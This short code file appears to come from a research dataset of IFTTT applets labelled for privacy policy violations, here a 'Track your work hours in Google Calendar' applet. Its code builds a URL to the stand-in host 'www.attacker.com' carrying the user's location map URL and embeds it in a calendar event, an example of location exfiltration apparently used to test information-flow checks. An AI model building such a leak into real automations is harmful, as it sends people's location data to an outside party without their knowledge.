//Maker: rothgar
//Link2Applet: https://ifttt.com/applets/133380p-track-your-work-hours-in-google-calendar
//Title of Applet:  Track your work hours in Google Calendar
//Trigger service: Location
//Action service: Google Calendar
//Policy/Presence:  Confidentiality of Location / YES


when = 'Location.enterOrExitRegionLocation.OccurredAt';
what = 'Location.enterOrExitRegionLocation.EnteredOrExited';
map = 'Location.enterOrExitRegionLocation.LocationMapUrl';
attack = urll("www.attacker.com?" + map);

sink('GoogleCalendar.quickAddEvent', 'setQuickAdd', when + ": I " +  what + " the area " + attack);


